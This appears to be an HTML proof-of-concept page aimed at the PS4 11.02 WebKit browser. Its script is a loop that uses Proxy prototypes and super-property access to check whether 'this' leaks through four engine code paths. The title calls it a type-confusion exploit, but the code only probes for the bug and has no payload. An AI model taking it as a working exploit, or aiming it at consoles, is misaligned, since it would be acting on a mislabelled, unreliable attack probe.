<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PS4 11.02 Type Confusion OOM‑Safe</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; padding: 1em; }
    #log { white-space: pre-wrap; }
    .ok  { color: #0f0; }
    .err { color: #f00; }
  </style>
</head>
<body>
  <h1>PS4 WebKit 11.02 – POC</h1>
  <script>
    alert("ppsploit");

function assert(x, label) {
    if (!x) {
        alert("Assertion failed: " + label);
        throw new Error("Bad assertion: " + label);
    }
}

(function() {
    function tryToLeakThisViaGetById() {
        class Leaker {
            leak() {
                return super.foo;
            }
        }

        Leaker.prototype.__proto__ = new Proxy({}, {
            get(target, propertyName, receiver) {
                return receiver;
            }
        });

        const foo = 42;
        const {leak} = Leaker.prototype;

        return (() => leak())();
    }

    function tryToLeakThisViaGetByVal() {
        class Leaker {
            leak() {
                return super[Math.random() < 0.5 ? "foo" : "bar"];
            }
        }

        Leaker.prototype.__proto__ = new Proxy({}, {
            get(target, propertyName, receiver) {
                return receiver;
            }
        });

        const foo = 42;
        const bar = 84;
        const {leak} = Leaker.prototype;

        return (() => leak())();
    }

    function tryToLeakThisViaSetById() {
        let receiver;
        class Leaker {
            leak() {
                super.foo = {};
                return receiver;
            }
        }
        Leaker.prototype.__proto__ = new Proxy({}, {
            set(target, propertyName, value, __receiver) {
                receiver = __receiver;
                return true;
            }
        });

        const foo = 42;
        const {leak} = Leaker.prototype;

        return (() => leak())();
    }

    function tryToLeakThisViaSetByVal() {
        let receiver;
        class Leaker {
            leak() {
                super[Math.random() < 0.5 ? "foo" : "bar"] = {};
                return receiver;
            }
        }

        Leaker.prototype.__proto__ = new Proxy({}, {
            set(target, propertyName, value, __receiver) {
                receiver = __receiver;
                return true;
            }
        });

        const foo = 42;
        const bar = 84;
        const {leak} = Leaker.prototype;

        return (() => leak())();
    }

    for (var i = 0; i < 1e5; i++) {
        let r;

        r = tryToLeakThisViaGetById();
        assert(r === undefined, "GetById: " + r);

        r = tryToLeakThisViaGetByVal();
        assert(r === undefined, "GetByVal: " + r);

        r = tryToLeakThisViaSetById();
        assert(r === undefined, "SetById: " + r);

        r = tryToLeakThisViaSetByVal();
        assert(r === undefined, "SetByVal: " + r);
    }
})();

  </script>
</body>
</html>
